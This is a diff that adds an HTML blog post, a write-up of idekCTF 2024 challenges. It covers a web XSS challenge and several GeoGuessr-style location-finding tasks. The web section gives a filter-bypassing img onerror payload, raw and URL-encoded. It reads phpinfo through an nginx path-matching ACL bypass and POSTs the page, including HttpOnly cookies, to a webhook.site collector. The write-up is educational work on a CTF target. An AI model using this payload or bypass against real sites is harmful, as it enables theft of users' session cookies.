@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>idekCTF Web and OSINT Writeup | cjxol.com</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="idekCTF Web and OSINT Writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck)." />
+<meta property="og:description" content="Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck)." />
+<link rel="canonical" href="https://www.cjxol.com/posts/idekctf-2024-writeup/" />
+<meta property="og:url" content="https://www.cjxol.com/posts/idekctf-2024-writeup/" />
+<meta property="og:site_name" content="cjxol.com" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-08-19T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="idekCTF Web and OSINT Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-08-19T00:00:00+01:00","datePublished":"2024-08-19T00:00:00+01:00","description":"Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck).","headline":"idekCTF Web and OSINT Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cjxol.com/posts/idekctf-2024-writeup/"},"url":"https://www.cjxol.com/posts/idekctf-2024-writeup/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cjxol.com/feed.xml" title="cjxol.com" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">cjxol.com</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">idekCTF Web and OSINT Writeup</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-08-19T00:00:00+01:00" itemprop="datePublished">Aug 19, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck).</p>
+
+<h2 id="webhello">web/Hello</h2>
+
+<h3 id="solution-tldr">Solution TLDR</h3>
+
+<ul>
+  <li>Bypass XSS characters filter</li>
+  <li>Bypass nginx ACL rules for PHP</li>
+</ul>
+
+<h3 id="challenge-and-solution">Challenge and Solution</h3>
+
+<p>Relatively easy challenge, with 161 solves. I built the payload iteratively to bypass the restrictions.</p>
+
+<p>Challenge goal is to get the flag set by the admin bot in the “HttpOnly” cookie. The <code class="highlighter-rouge">index.php</code> page is XSS-able, and and <code class="highlighter-rouge">info.php</code> page dumps <code class="highlighter-rouge">phpinfo()</code>, which shows the cookies in the request, including HttpOnly cookies.</p>
+
+<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">location</span> <span class="p">=</span> <span class="n">/info.php</span> <span class="p">{</span>
+    <span class="kn">allow</span> <span class="mi">127</span><span class="s">.0.0.1</span><span class="p">;</span>
+    <span class="kn">deny</span> <span class="s">all</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">location</span> <span class="p">~</span> <span class="sr">\.php$</span> <span class="p">{</span>
+    <span class="kn">root</span>           <span class="n">/usr/share/nginx/html</span><span class="p">;</span>
+    <span class="kn">fastcgi_param</span>  <span class="s">SCRIPT_FILENAME</span>  <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
+    <span class="kn">include</span> <span class="s">fastcgi_params</span><span class="p">;</span>  
+    <span class="kn">fastcgi_pass</span> <span class="s">unix:/var/run/php/php8.2-fpm.sock</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>However, as shown above, <code class="highlighter-rouge">nginx.conf</code> blocks access to <code class="highlighter-rouge">info.php</code>, and admin bot cannot acess it either. Referencing to <a href="https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass">HackTricks</a>, it can be bypassed with <code class="highlighter-rouge">http://idek-hello.chal.idek.team:1337/info.php/a.php</code>, where nginx does not match to <code class="highlighter-rouge">location = /info.php</code>, instead it matches to <code class="highlighter-rouge">location ~ \.php$</code> and PHP FPM processes with <code class="highlighter-rouge">info.php</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">Enhanced_Trim</span><span class="p">(</span><span class="nv">$inp</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$trimmed</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"/"</span><span class="p">,</span> <span class="s2">" "</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$trimmed</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$inp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nv">$name</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="mi">23</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"Hello, "</span><span class="mf">.</span><span class="nf">Enhanced_Trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">index.php</code> is XSS injectable, however it does not allow some characters. It was not able to have <code class="highlighter-rouge">&lt;/script&gt;</code> closing tag, and I did not get <code class="highlighter-rouge">script</code> tag without closing tag or using <code class="highlighter-rouge">\</code> instead of <code class="highlighter-rouge">/</code> in the closing tag work. I used <code class="highlighter-rouge">&lt;img&gt;</code> tag with <code class="highlighter-rouge">onerror</code> to make the script to run (<code class="highlighter-rouge">src</code> attribute was necessary too).</p>
+
+<p>The tag looks like this:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">a</span> <span class="na">onerror=</span><span class="s">"fetch('\\info.php\\a.php').then(r=&gt;r.text()).then(r=&gt;fetch('https:\\\\webhook.site\\[REDACTED]',{method:'POST',body:r}))"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">/</code> in the URLs above are replaced with <code class="highlighter-rouge">\</code> to bypass the filter (<code class="highlighter-rouge">\\</code> because of escape. It was only escaped once in JavaScript, HTML does not use <code class="highlighter-rouge">/</code> escape), and it still works.</p>
+
+<p>Replacing space <code class="highlighter-rouge">%20</code> with <code class="highlighter-rouge">%0C</code> to bypass filter, and the encoded payload for admin bot is below:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc%3Da%0Conerror%3D%22fetch%28%27%5C%5Cinfo%2Ephp%5C%5Ca%2Ephp%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28r%3D%3Efetch%28%27https%3A%5C%5C%5C%5Cwebhook%2Esite%5C%5C%5BREDACTED%5D%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Ar%7D%29%29%22%3E%0A
+</code></pre></div></div>
+
+<h2 id="miscnmpz-geoguessr-style">misc/NM<del>PZ</del>~ (GeoGuessr-style)</h2>
+
+<p>This is some notes on my process of solving some of the challenges with the team (also with a lot of luck involved). It may contain some errors due to limited knowledge on different locations, and just write about observations and knowledge gathered during solving the challenge.</p>
+
+<p><em>Image sizes are reduced in the blogpost.</em></p>
+
+<h3 id="beach_property-medium-brazil">beach_property (medium, Brazil)</h3>
+
+<p>Find the very unique-looking building, screenshot and search the image with Google Lens, find it to be the Veleiros Mar hotel in São Luís, Brazil. Then my teammate marked the location on the map to complete this task.</p>
+
+<p><img src="/assets/image/idekctf2024/veleiros-mar.png" alt="Screenshot of Veleiros Mar hotel in the challenge" /></p>
+
+<h3 id="idek_islands-medium-us-virgin-islands">idek_islands (medium, U.S. Virgin Islands)</h3>
+
+<p>Teammates identified through meta (Google car etc.) the location is in U.S. Virgin Islands, and likely to be in the island in the north. The location is by the coast, with coastline kinda concaves, and with buildings nearby. The shadows points inwards the land.</p>
+
+<p>I started searching through the south coast of the two main islands in the north of U.S. Virgin Islands, by looking at the street view coverage finding the roads close to coast, and sometimes enter into street view to check. Eventually found a road with street view coverage near the coast, and the buildings in the satellite view looks matching the ones in the image. It did not take too long. Entered street view and confirmed the location matches.</p>
+
+<h3 id="rise_above-hard-indonesia">rise_above (hard, Indonesia)</h3>
+
+<p>It took a long time to solve this one.</p>
+
+<p>Teammates identified the location in in Indonesia. There is top of a church in the image, signs on the other building saying “RUMAH KEPALA JAGA 1”, and teammate also identified the “Indonesian Democratic Party of Struggle” flag in the image.</p>
+
+<p>I position Google maps at Indonesia and looked up “rumah kepala jaga”, it showed the name with other numbers but not “1”. I looked through some of the locations however non of them was the location. They were mostly located east-most of Sulawesi Utara on one of the main island. There were also a village with many of the same flags in the image, however that village had a church looked different. Then I zoomed out the map a bit and looked up “church” in the area, and the 2nd church I clicked on and entered street view to see was the church I was looking for (extremely lucky I guess).</p>
+
+  </div><a class="u-url" href="/posts/idekctf-2024-writeup/" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">cjxol.com</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">cjxol.com</li><li><a class="u-email" href="mailto:i@cjxol.com">i@cjxol.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/allc"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">allc</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
